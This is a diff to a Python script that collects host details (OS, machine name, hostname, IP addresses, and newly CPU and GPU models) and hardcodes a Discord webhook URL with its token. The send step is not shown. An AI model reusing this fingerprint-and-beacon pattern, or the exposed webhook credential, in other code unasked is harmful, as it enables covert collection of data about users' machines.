@@ -1,6 +1,8 @@
 import platform
 import requests
 import socket
+from cpuinfo import get_cpu_info
+import GPUtil
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"
@@ -15,14 +17,22 @@ def get_public_ip():
 
 def get_machine_info():
     try:
+        cpu_info = get_cpu_info()
+        gpu_info = GPUtil.getGPUs()
+        
+        gpu_details = [
+            f"{gpu.name} (Total Memory: {gpu.memoryTotal}MB)" for gpu in gpu_info
+        ]
+        
         return {
             "OS": platform.system(),
             "OS Version": platform.version(),
             "Machine Name": platform.node(),
-            "Processor": platform.processor(),
+            "CPU": cpu_info.get("brand_raw", "Unknown CPU"),
             "Architecture": platform.architecture()[0],
             "Hostname": socket.gethostname(),
             "IP Address": socket.gethostbyname(socket.gethostname()),
+            "GPUs": "; ".join(gpu_details) if gpu_details else "No GPU Detected",
         }
     except Exception as e:
         return {"Error": f"Failed to retrieve machine info: {e}"}
